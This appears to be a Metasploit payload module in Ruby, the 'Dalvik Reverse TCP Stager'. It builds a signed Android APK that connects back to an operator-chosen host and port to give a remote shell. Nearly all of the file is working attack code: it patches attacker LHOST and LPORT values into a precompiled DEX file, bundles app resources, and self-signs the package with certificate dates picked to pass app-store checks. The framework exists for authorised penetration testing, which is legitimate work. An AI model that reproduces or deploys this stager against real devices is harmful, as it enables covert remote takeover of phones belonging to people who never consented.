##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'			=> 'Dalvik Reverse TCP Stager',
      'Description'	=> 'Connect back stager',
      'Author'		=> 'timwr',
      'License'		=> MSF_LICENSE,
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'Handler'		=> Msf::Handler::ReverseTcp,
      'Stager'		=> {'Payload' => ""}
    ))
  end

  def string_sub(data, placeholder, input)
    data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})

    string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
    string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "res", "drawable-mdpi", "icon.png" ],
      [ "res", "layout", "main.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    x509_name = OpenSSL::X509::Name.parse(
      "C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=Unknown"
      )
    key  = OpenSSL::PKey::RSA.new(1024)
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = 1
    cert.subject = x509_name
    cert.issuer = x509_name
    cert.public_key = key.public_key

    # Some time within the last 3 years
    cert.not_before = Time.now - rand(3600*24*365*3)

    # From http://developer.android.com/tools/publishing/app-signing.html
    # """
    # A validity period of more than 25 years is recommended.
    #
    # If you plan to publish your application(s) on Google Play, note
    # that a validity period ending after 22 October 2033 is a
    # requirement. You can not upload an application if it is signed
    # with a key whose validity expires before that date.
    # """
    # The timestamp 0x78045d81 equates to 2033-10-22 00:00:01 UTC
    cert.not_after = Time.at( 0x78045d81  + rand( 0x7fffffff - 0x78045d81 ))

    jar.sign(key, cert, [cert])

    jar
  end

end
